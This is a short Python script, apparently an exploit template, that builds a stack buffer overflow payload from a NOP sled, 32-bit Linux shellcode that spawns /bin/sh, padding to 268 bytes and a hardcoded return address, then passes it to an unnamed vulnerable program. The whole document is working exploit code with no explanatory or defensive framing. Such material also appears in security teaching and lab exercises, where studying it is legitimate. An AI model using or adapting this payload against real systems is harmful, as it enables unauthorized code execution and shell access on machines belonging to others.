import struct

# Shellcode that runs /bin/sh
SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Address to return to after overflowing the buffer
RETURN_ADDRESS = struct.pack("<I", 0xffffd630)

# Create payload with NOP sled and shellcode
payload = b"\x90" * 100 + SHELLCODE + b"A" * (268 - 100 - len(SHELLCODE)) + RETURN_ADDRESS

# Send payload to vulnerable program
send_to_vulnerable_program(payload)
